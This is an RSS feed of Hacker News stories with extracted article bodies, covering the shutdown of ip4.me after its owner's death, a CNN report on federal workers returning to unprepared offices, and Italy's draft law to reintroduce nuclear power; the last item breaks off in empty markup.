<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 04 Mar 2025 17:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[The owner of ip4.me/ip6.me, Kevin Loch, passed away (170 pts)]]></title>
            <link>https://ip4only.me/</link>
            <guid>43256298</guid>
            <pubDate>Tue, 04 Mar 2025 15:54:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ip4only.me/">https://ip4only.me/</a>, See on <a href="https://news.ycombinator.com/item?id=43256298">Hacker News</a></p>
<div id="readability-page-1" class="page">
<h2>!! NOTICE !!</h2>
<p>
Notice: The owner of ip4.me/ip6.me, Kevin Loch, passed away.<br>
The Kevin M Loch Estate will be shutting down Kevin's websites in the near future (4/1/2025).<br>
Inquiries for purchasing Kevin's domains may be sent to ipadmin@dulles-ix.net.
</p>
<p>
Click this link to continue to your ip4/ip6 address reporting <a href="https://ip4only.me/home.cgi">Website</a>
</p>
<p>
List of Websites impacted:
ip4.me, ip4only.me<br>
ip6addr.com, ip6addr.net, ip6addr.org<br>
ip6.me, ip6only.me<br>
ipv6addr.com, ipv6addr.net, ipv6addr.org<br>
onlyip4.me, onlyip6.me<br>
whatismyipv6address.com, whatismyipv6address.net, whatismyipv6address.org<br>
whatismyv6.com, whatismyv6.net, whatismyv6.org<br>
</p>


</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bayleaf · Building a low-profile wireless split keyboard (224 pts)]]></title>
            <link>https://www.graz.io/articles/bayleaf-wireless-keyboard</link>
            <guid>43255529</guid>
            <pubDate>Tue, 04 Mar 2025 15:00:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.graz.io/articles/bayleaf-wireless-keyboard">https://www.graz.io/articles/bayleaf-wireless-keyboard</a>, See on <a href="https://news.ycombinator.com/item?id=43255529">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Federal workers ordered to return to offices without desks, Wi-Fi and lights (250 pts)]]></title>
            <link>https://www.cnn.com/2025/03/04/politics/federal-employees-return-to-office-problems/index.html</link>
            <guid>43253562</guid>
            <pubDate>Tue, 04 Mar 2025 12:14:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnn.com/2025/03/04/politics/federal-employees-return-to-office-problems/index.html">https://www.cnn.com/2025/03/04/politics/federal-employees-return-to-office-problems/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=43253562">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-editable="content" itemprop="articleBody" data-reorderable="content">
                <p><cite>
      <span data-editable="location"></span>
      <span data-editable="source">CNN</span>
        &nbsp;—&nbsp;
    </cite>
</p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thliwo000v2cozgh2xbdev@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Millions of federal workers were <a href="https://www.cnn.com/2025/01/23/business/trump-federal-workers-rto-mandate/index.html">ordered to return to offices</a> across the country in recent weeks, marking an end to Covid-era rules allowing more flexibility to work from home.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thlk6200003b6m4ysl92ra@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Many have come back to workplaces that weren’t ready for them.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thv5ao00083b6mw2qej22u@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            In one Department of Health and Human Services office, there was no Wi-Fi or full electricity in the first hours when people returned last week.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok3000e3b6mmdfnpnek@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Department of Education employees at an office in Dallas returned to ethernet cords in piles around the floor, random wires sticking out of walls, and motion-sensor lights that weren’t working correctly, leading to dark workspaces. One employee tripped over a pile of cords on her first day back, resulting in a large gash on her foot. She’s submitted a workers’ compensation complaint.
    </p>

  
<div data-image-variation="image_inline-small" data-breakpoints="{&quot;image_inline-small--eq-extra-small&quot;: 115, &quot;image_inline-small--eq-small&quot;: 300, &quot;image_inline-small--eq-large&quot;: 660}" data-uri="cms.cnn.com/_components/image/instances/cm7ti30t500013b6mvbtdzglx@published" data-name="c-IMG_2545.jpg" data-component-name="image" data-observe-resizes="" data-original-ratio="0.666875" data-original-height="1067" data-original-width="1600" data-url="https://media.cnn.com/api/v1/images/stellar/prod/c-img-2545.jpg?c=original" data-editable="settings">
       <picture><source height="1067" width="1600" media="(min-width: 1280px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-img-2545.jpg?q=w_256,c_fill/f_webp" type="image/webp"><source height="1067" width="1600" media="(min-width: 960px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-img-2545.jpg?q=w_256,c_fill/f_webp" type="image/webp"><source height="1067" width="1600" media="(min-width: 480px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-img-2545.jpg?q=w_256,c_fill/f_webp" type="image/webp"><source height="1067" width="1600" media="(max-width: 479px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-img-2545.jpg?q=w_680,c_fill/f_webp" type="image/webp"><img src="https://media.cnn.com/api/v1/images/stellar/prod/c-img-2545.jpg?q=w_256,c_fill" alt="Ethernet cords lay on the floor at a Department of Education office in Dallas. " onload="this.classList.remove('image_inline-small__dam-img--loading')" onerror="imageLoadError(this)" height="1067" width="1600" loading="lazy"></picture>
    </div>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000f3b6mlbe4g8bi@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            And a Department of Defense employee who returned to in-office work and handles sensitive information was stuck in a conference room with people on different teams, forcing them to leave the room to make calls. The employee was eventually moved to an office — but one without Wi-Fi, so they had to use their phone’s spotty hot spot.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000g3b6mvpdz4pmj@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “The only thing a return to the office has given me is an hour of traffic while driving and a loss in efficiency,” said the worker, who requested anonymity for fear of job reprisals.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000h3b6my9a5k5lc@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The problems, confusion and slipups that federal employees told CNN they’ve encountered returning to the office have only added to the chaos inside the workforce six weeks into a Trump administration determined to <a href="https://www.cnn.com/politics/tracking-federal-workforce-firings-dg/index.html">slash the size and scope</a> of the federal government.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000i3b6m1ztsyzip@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Some federal workers being told to return to the office have no space to return to. At least two office buildings used by the Interior Department in the Western US were told last week their leases had been canceled, according to a source familiar with the matter — while a third office housing hundreds of people was notified its lease will be up in June.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000j3b6maute1e0f@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            One source said the General Services Administration, which manages federal buildings, did not appear to coordinate the lease terminations with Interior officials, leaving employees unclear of what to do. An Interior spokesperson said the department was “working with GSA to ensure facilities or alternative options will be available” for employees.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000k3b6myjlfpb4f@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            President <a href="https://www.cnn.com/politics/president-donald-trump-47">Donald Trump</a> has repeatedly demanded all federal workers return to the office as his administration has undertaken sweeping actions seeking to drastically reduce the size of the federal workforce, including mass firings of probationary workers and employees in government diversity departments.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000l3b6mpk1596b3@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Trump’s in-office mandate has been coupled with a push to slash government real estate, setting up a dilemma of too little space for too many people. Even before Trump took office in January, the federal government was downsizing office space due in part to the shift toward telework during the pandemic.
    </p>

  





    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000m3b6m9c6j2qe2@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Nearly half of the more than 2.3 million civilian federal workers were eligible for telework, and 10% were in remote positions with no expectation of in-person work, according to a 2024 Office of Management and Budget report.<strong> </strong>Many workers stopped working full time in their offices during the Covid-19 pandemic, but others had long-held arrangements for working from home<strong> </strong>— and now could face the prospect of choosing between fundamentally changing their job or leaving it altogether.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000n3b6m0hjimos2@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            More than 80% of federal workers reside outside the Washington, DC, metro area, meaning the return-to-office mandate will cause ripple effects across the country.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000o3b6m93ver5jt@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Some government employees are now making the post-pandemic transition that millions of private-sector workers already have — upending their lives and schedules in the process. For many federal employees, however, those worries have been subsumed by their larger fear of losing jobs entirely in Trump’s multipronged effort to shrink the federal workforce.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000p3b6m4evksl91@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Federal workers and union officials told CNN they see this as part of an attempt by the Trump administration to <a href="https://www.propublica.org/article/video-donald-trump-russ-vought-center-renewing-america-maga" target="_blank">make life uncomfortable</a> for federal workers in hopes that some will quit.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000q3b6mquhadaqy@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Trump and Elon Musk, de facto chief of the Department of Government Efficiency, have both threatened to fire workers who do not come back to the office, even those represented by unions who have signed long-term telework agreements. Many federal agencies set February 24 as the first date for some of their employees to comply with Trump’s return-to-office directive.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000r3b6mvsxcej23@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “If they don’t report for work, we’re firing them. In other words, you have to go to office,” Trump said at a conservative political conference last month, while claiming that his <a href="https://www.cnn.com/2025/02/18/politics/mar-a-lago-trump-remote-work-golf/index.html">golf game would improve dramatically</a> if he were to work remotely.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000s3b6mjad0bg9i@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Federal employee unions have argued Trump’s demand to break long-term telework agreements <a href="https://www.cnn.com/2025/02/07/politics/trump-musk-federal-workforce/index.html">is unlawful</a>, though the return-to-office mandate isn’t central to the major legal challenges unions have brought against the president. But there have been pockets of pushback, such as the employee union at the Environmental Protection Agency, which is demanding to bargain around the return-to-office mandate. Additionally, some individual EPA employees represented by the union are filing grievances around returning to the office.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000t3b6moq891utg@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            One of their biggest concerns, an EPA union official told CNN, is “local fire and safety regulations — how many people can you jam into a room?”
    </p>

  

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000v3b6m57ha4i02@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            DOGE has kept a running list on its website touting more than 200 building leases the Musk-run agency says it’s canceled. The canceled leases, which include Social Security Administration and US attorneys’ offices, have <a href="https://www.kristv.com/news/local-news/d-o-g-e-terminates-lease-for-local-u-s-attorneys-office" target="_blank">raised questions locally</a> about where those employees are supposed to go.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000w3b6mla7qqoax@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Trump also signed an executive order last week instructing each government agency to identify all leases that can be terminated and submit a plan to dispose of “government-owned real property which has been deemed by the agency as no longer needed.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000x3b6mj4swzprz@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The drive to shrink the federal government’s real estate portfolio predates the Trump administration. The Office of Management and Budget issued a “Reduce the Footprint” directive in 2015 that requires agencies to make more efficient use of federal property and dispose of surplus assets.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000y3b6mlikxf8fh@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Last year’s OMB report included a list of agencies’ efforts to downsize their holdings. For instance, the Department of Veterans Affairs reduced office space in its headquarters locations in the Washington, DC, metro area by 16% between 2020 and 2022, saving $15 million annually.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4000z3b6mrrjwv4ij@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The GSA cut its own footprint by more than 2 million square feet over 10 years, avoiding $300 million in costs. And the Department of Energy moved out of 193,000 square feet of leased space in 2023, saving $9 million annually.
    </p>

<div data-image-variation="image_large" data-breakpoints="{&quot;image_large--eq-extra-small&quot;: 115, &quot;image_large--eq-small&quot;: 300, &quot;image_large--eq-large&quot;: 660}" data-uri="cms.cnn.com/_components/image/instances/cm7ti3k1r00033b6m5wj2k31k@published" data-name="c-GettyImages-2201176517.jpg" data-component-name="image" data-observe-resizes="" data-original-ratio="0.6666666666666666" data-original-height="1600" data-original-width="2400" data-url="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2201176517.jpg?c=original" data-editable="settings">
       <picture><source height="1600" width="2400" media="(min-width: 1280px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2201176517.jpg?q=w_1110,c_fill/f_webp" type="image/webp"><source height="1600" width="2400" media="(min-width: 960px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2201176517.jpg?q=w_1015,c_fill/f_webp" type="image/webp"><source height="1600" width="2400" media="(min-width: 480px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2201176517.jpg?q=w_1160,c_fill/f_webp" type="image/webp"><source height="1600" width="2400" media="(max-width: 479px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2201176517.jpg?q=w_680,c_fill/f_webp" type="image/webp"><img src="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2201176517.jpg?q=w_1110,c_fill" alt="A pedestrian near a General Services Administration building in Washington, DC, on Monday, February 24. " onload="this.classList.remove('image_large__dam-img--loading')" onerror="imageLoadError(this)" height="1600" width="2400" loading="lazy"></picture>
    </div>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400103b6mb5d7s02n@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Those downsizings have had an impact. One federal employee still waiting for their date to return to the office told CNN they suspect it’s been delayed because of a lack of room. Their agency, which the employee asked not to name because of concerns for their job, has been shedding office space for several years, so teleworking staffers have had to reserve desks in the remaining locations for the days they come in.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400113b6moszzk9vr@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The space constraint, coupled with the Trump administration’s <a href="https://www.cnn.com/2025/02/26/politics/federal-mass-layoffs-trump-memo/index.html">reduction-in-force order</a>, has the worker fearing their agency will suffer heavy layoffs. “The only way RTO (return-to-office) works in these types of situations is if you now reduce the number of people,” the employee said.
    </p>

  

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400133b6myk6mc303@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Multiple federal agencies brought the bulk of their employees back last week, a return that was met in some cases with a lack of desks, basic supplies and working equipment.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400143b6mo8c8mzg8@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “There was very little prep and planning and it was messy with equipment,” an HHS staffer told CNN. The employee, who asked for their specific location not to be named, said there were reports of Wi-Fi and electricity not working.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7tzbkg60000356mwlpg5w7y@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Asked about the issue, Andrew Nixon, HHS’ communications director, said the agency is complying with Trump’s return to the office executive order. “We look forward to seeing and collaborating with our colleagues in person to Make America Healthy Again,” he continued.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400153b6mwhuve4yt@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The Department of Education sent an email last week to staff in regional offices acknowledging the shortcomings in some facilities on Day 1 of their return.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400163b6mbx9ev3n5@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “At the present time we are unable to deploy full peripheral setups in the regional/remote offices,” the department’s Office of the Chief Information Officer told employees in an email, which was obtained by CNN.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400173b6mmbs9f9rw@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Sheria Smith, president of the American Federation of Government Employees Local 252 in Dallas and a Department of Education employee, said her office was “chaos” when employees returned. She filed the workers’ comp complaint after injuring her foot tripping over a pile of cords on the floor.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400183b6mgniynv3n@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “The facilities were not actually ready for us to return,” Smith said.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok400193b6m4wt9l8ci@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “No one is on-site to try to fix the issues,” she added, saying the mess leads her to believe “they would be hoping that we would quit, I guess — that they didn’t expect us to come.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001a3b6mit76tbc8@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Another Department of Education employee in Washington, DC, said the first week back lacked basic office needs: computers, pens and headsets — as well as private space and conference rooms necessary for confidential job requirements.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001b3b6m0l2xr20t@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            At the National Oceanic and Atmospheric Administration headquarters in Silver Spring, Maryland, a telework policy has been in place for more than 20 years, officials said. Many employees had been teleworking three to four days a week and are now adapting to the rigidity of returning to the office.
    </p>

<div data-image-variation="image_large" data-breakpoints="{&quot;image_large--eq-extra-small&quot;: 115, &quot;image_large--eq-small&quot;: 300, &quot;image_large--eq-large&quot;: 660}" data-uri="cms.cnn.com/_components/image/instances/cm7ti3w9800053b6m4thchr42@published" data-name="c-GettyImages-2203083573.jpg" data-component-name="image" data-observe-resizes="" data-original-ratio="0.6670833333333334" data-original-height="1601" data-original-width="2400" data-url="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2203083573.jpg?c=original" data-editable="settings">
       <picture><source height="1601" width="2400" media="(min-width: 1280px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2203083573.jpg?q=w_1110,c_fill/f_webp" type="image/webp"><source height="1601" width="2400" media="(min-width: 960px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2203083573.jpg?q=w_1015,c_fill/f_webp" type="image/webp"><source height="1601" width="2400" media="(min-width: 480px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2203083573.jpg?q=w_1160,c_fill/f_webp" type="image/webp"><source height="1601" width="2400" media="(max-width: 479px)" srcset="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2203083573.jpg?q=w_680,c_fill/f_webp" type="image/webp"><img src="https://media.cnn.com/api/v1/images/stellar/prod/c-gettyimages-2203083573.jpg?q=w_1110,c_fill" alt="Hundreds of demonstrators gather to protest against Department of Government Efficiency (DOGE) cuts outside the headquarters of the National Oceanic and Atmospheric Administration on March 3, in Silver Spring, Maryland." onload="this.classList.remove('image_large__dam-img--loading')" onerror="imageLoadError(this)" height="1601" width="2400" loading="lazy"></picture>
    </div>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001c3b6mt5ajyxux@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “Morale is pretty low,” a staffer in the agency said. “If you have a dentist appointment at 3 p.m. near where you live, and it ends at 4:15 p.m., you cannot work that last hour from home. You have to go back to the office or take sick leave.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001d3b6m8sdzmo6f@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The return-to-office mandate comes as budget cuts at EPA led to reduced cleaning and facility services at key offices, even before the Trump administration took over.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001e3b6mokfltdj8@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            In the three major EPA offices around the country that make up the agency’s headquarters — Washington, Cincinnati and Research Triangle Park, North Carolina — health units were closed and in-office mail delivery was cut back, according to a memo obtained by CNN. In Cincinnati, drinking fountain cleaning schedules were reduced to once per week, carpets and hallways were swept once a month, and bathroom cleanings were pared back to once a day.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001f3b6m81n56i52@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “With these people coming back to the offices, they’re going to have fewer facility services,” the EPA union official said.
    </p>

  

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001h3b6mxf5m3uln@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The 2024 OMB report found those eligible for telework spend about 60% of their working hours in the office, on average, though that figure varies widely by agency. About 10% of staffers have remote jobs, where they are not expected to report to an office at all, according to the report, which noted the Biden administration also directed agencies to increase the amount of time federal workers spent at the office.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001i3b6m9ga6xl82@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The Biden administration’s goal was for teleworkers to spend at least 50% of the time in the office. Now Trump turned that into a full-time mandate.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001j3b6mw8ryoj8k@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            But not all federal workers are returning at the same pace, as Trump’s executive order, issued hours after he took office in January, directed agencies to terminate remote work arrangements “as soon as practicable.”
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001k3b6movkqhmp4@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Several agencies, including the departments of Veterans Affairs and Health and Human Services, have said political appointees, senior executives and other senior staffers could no longer work remotely or telework as of February 24, and neither could supervisors who live within 50 miles of an agency facility.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001l3b6mqhwzi9zp@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            Others have more time. For instance, at the VA, lower-level non-union employees who live within 50 miles of a facility will have their remote and telework arrangements terminated by April 28, except for ad hoc or situational circumstances, the agency said. But these arrangements for supervisors and other non-union employees who reside farther away were not ended — those staffers will receive additional guidance.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001m3b6mcycmncdy@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            As for union workers at the VA, their return-to-office date will be announced at a later time, the agency said.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7tpdftm00053b6mfxan4xsn@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            At the Department of Education, more than 70% of its workforce started reporting to the Washington and regional offices full time last week, the agency said in a news release. The rest are expected back by June 1 after building renovations and relocation arrangements are complete.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001n3b6maetty1jv@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            However, many union members at the Department of Housing and Urban Development who were previously able to telework on certain days had to return to the office full time in late February, said Antonio Gaines, president of the AFGE Council 222, which represents 5,300 employees at the agency. Workers at some regional and field offices are exempt for now because of lack of space and safety concerns, including building renovations and inadequate HVAC systems.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001o3b6mk4fzp47r@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The mandate violates the union’s collective bargaining agreement, he argued.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001p3b6mwn7j8d8n@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            “They made a unilateral decision to bypass the negotiating process,” Gaines said of the agency, adding that the union plans to file a complaint on this matter as part of a bigger grievance package.
    </p>

    <p data-uri="cms.cnn.com/_components/paragraph/instances/cm7thvok4001q3b6meyhnp4y8@published" data-editable="text" data-component-name="paragraph" data-article-gutter="true">
            The department did not return a request for comment.
    </p>

              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Italy moves to reverse anti-nuclear stance (206 pts)]]></title>
            <link>https://www.world-nuclear-news.org/articles/cabinet-moves-to-reverse-italys-anti-nuclear-stance</link>
            <guid>43253407</guid>
            <pubDate>Tue, 04 Mar 2025 11:51:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.world-nuclear-news.org/articles/cabinet-moves-to-reverse-italys-anti-nuclear-stance">https://www.world-nuclear-news.org/articles/cabinet-moves-to-reverse-italys-anti-nuclear-stance</a>, See on <a href="https://news.ycombinator.com/item?id=43253407">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
                    Monday, 3 March 2025

                    </p>

                        <p>Italy's Council of Ministers has approved a draft law calling for the government to adopt a series of legislative decrees to create the legal framework for the reintroduction of nuclear power, which was phased out following a referendum in 1987.</p>
                    
                            <figure>
                                <img src="https://www.world-nuclear-news.org/images/articles/GilbertoPichettoFratin_67730.jpg" alt="Cabinet moves to reverse Italy's anti-nuclear stance">
                                    <figcaption>Pichetto Fratin speaking at a press conference following the cabinet meeting (Image: Ministry of Environment and Energy Security)</figcaption>

                            </figure>
                    
                    


               

                <p>On 28 February, on the proposal of President Giorgia Meloni and the Minister of the Environment and Energy Security Gilberto Pichetto Fratin, the Council of Ministers (the Italian cabinet) approved the draft delegation law on 'sustainable nuclear energy'.</p>

<p>The government said the text is aimed at "the inclusion of sustainable nuclear and fusion in the so-called 'Italian energy mix' and intervenes organically from an economic, social and environmental perspective, within the framework of European decarbonisation policies with a time horizon of 2050, consistently with the objectives of carbon neutrality and security of supply".</p>

<p>It added that the intervention aims to: ensure continuity of energy supply in the presence of a constant increase in demand and promote the achievement of energy independence; contribute to the decarbonisation objectives necessary to tackle climate change; and ensure the sustainability of costs borne by end users and the competitiveness of the national industrial system.</p>

<p>The draft law says that Italy should make "a clear break ... with respect to the nuclear plants of the past" and "use of the best available technologies, including modular and advanced technologies". It calls for the government to establish an independent authority for the regulation, supervision and control of nuclear infrastructures.</p>

<p>"Promoters of nuclear projects must provide adequate financial and legal guarantees to cover the costs of construction, operation and decommissioning of the plants and for risks, even those not directly attributable to them, arising from nuclear activity," it adds.</p>

<p>The draft law requires the government to adopt a series of legislative decrees, within 12 months of entry into force, to "organically regulate the entire life cycle of the new sustainable energy, through the drafting of a national programme: from the testing, localisation, construction and operation of the new reactors, to the issue of manufacturing and reprocessing of the fuel will be addressed in a circular economy vision". It will also "serve to provide training and information tools, train new technicians and professionals in the sector, and identify benefits for the territories involved".</p>

<p>The draft law will now be submitted to parliament for final approval.</p>

<p>"With the latest generation nuclear, together with renewables, we will be able to achieve the objectives of decarbonisation, guaranteeing the full energy security of the country," Minister Pichetto Fratin said. "In this way, Italy is ready to face the challenges of the future."</p>

<h4><span>The background</span><br>
&nbsp;</h4>

<p>Italy operated a total of four nuclear power plants starting in the early 1960s but decided to phase out nuclear power in a referendum that followed the 1986 Chernobyl accident. It closed its last two operating plants, Caorso and Trino Vercellese, in 1990.</p>

<p>In late March 2011, following the Fukushima Daiichi accident, the Italian government approved a moratorium of at least one year on construction of nuclear power plants in the country, which had been looking to restart its long-abandoned nuclear programme.</p>

<p>The public mood has changed since then, and in May 2023, the Italian Parliament approved a motion to urge the government to consider incorporating nuclear power into the country's energy mix. In September last year, the first meeting was held of the National Platform for a Sustainable Nuclear, set up by the government to define a time frame for the possible resumption of nuclear energy in Italy and identify opportunities for the country's industrial chain already operating in the sector.</p>

<p>Italy's government included potential nuclear capacity - up to 16 GW/20-22% of capacity by 2050 - in its National Integrated Energy and Climate Plan, which was submitted to the European Commission on 1 July 2024.</p>

<p>Speaking the following day at the <em>Global Energy Transition Congress in Milan</em>, Pichetto Fratin, said: "We expect to be able to reach about 8 GW from nuclear power by 2050, covering more than 10% of the nation's electricity demand. This percentage may increase to over 20-22% by fully exploiting the potential of nuclear power in our country."</p>


                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The End of Weather Forecasting (103 pts)]]></title>
            <link>https://thinc.blog/2025/03/03/the-end-of-weather-forecasting/</link>
            <guid>43251150</guid>
            <pubDate>Tue, 04 Mar 2025 06:49:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thinc.blog/2025/03/03/the-end-of-weather-forecasting/">https://thinc.blog/2025/03/03/the-end-of-weather-forecasting/</a>, See on <a href="https://news.ycombinator.com/item?id=43251150">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="page">
		<p><a href="#content">
			Skip to content		</a></p><!-- .site-header -->

		<div id="content">
	<main id="main">
		
<article id="post-106095">
	<!-- .entry-header -->

	
	
	<div>
		<div>
